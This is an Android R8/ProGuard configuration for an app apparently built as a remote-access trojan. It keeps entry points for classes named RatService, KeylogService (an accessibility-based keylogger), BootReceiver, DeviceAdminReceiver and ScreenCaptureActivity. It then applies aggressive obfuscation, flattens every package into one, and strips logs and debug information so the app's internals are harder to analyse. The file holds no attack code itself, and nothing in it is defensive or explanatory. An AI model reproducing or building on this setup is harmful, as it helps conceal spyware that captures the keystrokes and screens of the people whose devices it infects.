# ── Keep Android framework entry points ──────────────────────────────────────
# R8 keeps manifest-referenced classes automatically; these rules cover
# anything referenced by string, reflection, or the framework callback API.

# Keep all exported components (Android instantiates them by class name)
-keep public class com.company.rat.MainActivity
-keep public class com.company.rat.BootReceiver
-keep public class com.company.rat.DeviceAdminReceiver
-keep public class com.company.rat.ScreenCaptureActivity

# Services — keep class names, obfuscate internals
-keep public class com.company.rat.RatService {
    public <init>();
    public android.os.IBinder onBind(android.content.Intent);
    public int onStartCommand(android.content.Intent, int, int);
    public void onCreate();
    public void onDestroy();
}
-keep public class com.company.rat.KeylogService {
    public <init>();
    public void onServiceConnected();
    public void onInterrupt();
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onCreate();
    public void onDestroy();
    public static void flushLogs();
}

# BroadcastReceivers need onReceive
-keepclassmembers class * extends android.content.BroadcastReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
}

# DeviceAdminReceiver callbacks
-keepclassmembers class * extends android.app.admin.DeviceAdminReceiver {
    public void onEnabled(android.content.Context, android.content.Intent);
    public void onDisabled(android.content.Context, android.content.Intent);
    public void onPasswordChanged(android.content.Context, android.content.Intent);
    public java.lang.CharSequence onDisableRequested(android.content.Context, android.content.Intent);
}

# AccessibilityService framework callbacks must keep their names
-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    public void onServiceConnected();
}

# ── Aggressive obfuscation settings ──────────────────────────────────────────

# Rename all packages to a single flat package 'a'
-repackageclasses a

# Allow access modifications needed for inlining
-allowaccessmodification

# Obfuscate everything not explicitly kept
-obfuscationdictionary /dev/null
-classobfuscationdictionary /dev/null
-packageobfuscationdictionary /dev/null

# ── Strip debug artifacts ─────────────────────────────────────────────────────

# Remove all android.util.Log calls (strips log strings from DEX)
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
    public static int wtf(...);
}

# Remove source file names and line numbers from stack traces
-renamesourcefileattribute x
-keepattributes !LineNumberTable, !SourceFile

# ── Preserve runtime-needed attributes ───────────────────────────────────────

-keepattributes Signature, *Annotation*, EnclosingMethod, InnerClasses

# ── Suppress common library warnings ─────────────────────────────────────────
-dontwarn androidx.**
-dontwarn kotlin.**
-dontwarn javax.annotation.**
